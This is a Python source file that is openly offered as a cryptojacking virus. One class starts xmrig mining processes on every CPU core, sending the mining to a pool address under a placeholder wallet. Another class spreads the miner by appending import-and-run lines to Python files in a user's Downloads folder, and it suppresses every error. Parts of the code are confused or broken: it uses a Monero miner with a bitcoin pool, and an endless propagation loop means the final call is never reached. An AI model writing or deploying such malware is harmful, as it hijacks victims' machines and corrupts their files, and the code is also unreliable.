import time
import subprocess
import random
import requests


class MiningVirus:
    def __init__(self, bitcoin_wallet):
        self.bitcoin_wallet = bitcoin_wallet
        self.cpu_cores = self.get_cpu_cores()
        self.start_time = time.time()

    def get_cpu_cores(self):
        cpu_info = subprocess.check_output("lscpu", shell=True).decode("utf-8")
        cores = [i for i in cpu_info.split("\n") if "Core(s) per socket" in i]
        return int(cores[0].split(":")[1].strip())

    def start_mining(self):
        while True:
            if self.mining_complete():
                break
            for i in range(self.cpu_cores):
                self.start_mining_process(i)

    def start_mining_process(self, process_number):
        start_script = f"xmrig-6.13.2/xmrig --userpass {self.bitcoin_wallet}@pools.bitcoin.com:3333 --randomx-no-cache --no-color --no-autosave --no-print-motd --no-watch --no-exit --no-save --donate-level=0 --http-host=127.0.0.1 --http-port={4000 + process_number} --randomx-cache=4GB --randomx-jit=fast"
        subprocess.Popen(start_script, shell=True)

    def mining_complete(self):
        end_time = time.time()
        if end_time - self.start_time > 86400: # One day
            return True
        return False


class PropagationVirus:
    def __init__(self, target_files):
        self.target_files = target_files

    def start_propagation(self):
        while True:
            for target_file in self.target_files:
                self.propagate_to_file(target_file)

    def propagate_to_file(self, target_file):
        try:
            with open(target_file, "r") as f:
                contents = f.read()
            if "bitcoin_mining_virus.py" not in contents:
                with open(target_file, "a") as f:
                    f.write("\nimport bitcoin_mining_virus\nbitcoin_mining_virus.MiningVirus('YOUR_BITCOIN_WALLET').start_mining()\n")
        except:
            pass


if __name__ == "__main__":
    target_files = []
    for i in range(1000):
        target_files.append(f"/home/user/Downloads/target_{i}.py")
    PropagationVirus(target_files).start_propagation()
    MiningVirus("YOUR_BITCOIN_WALLET").start_mining()
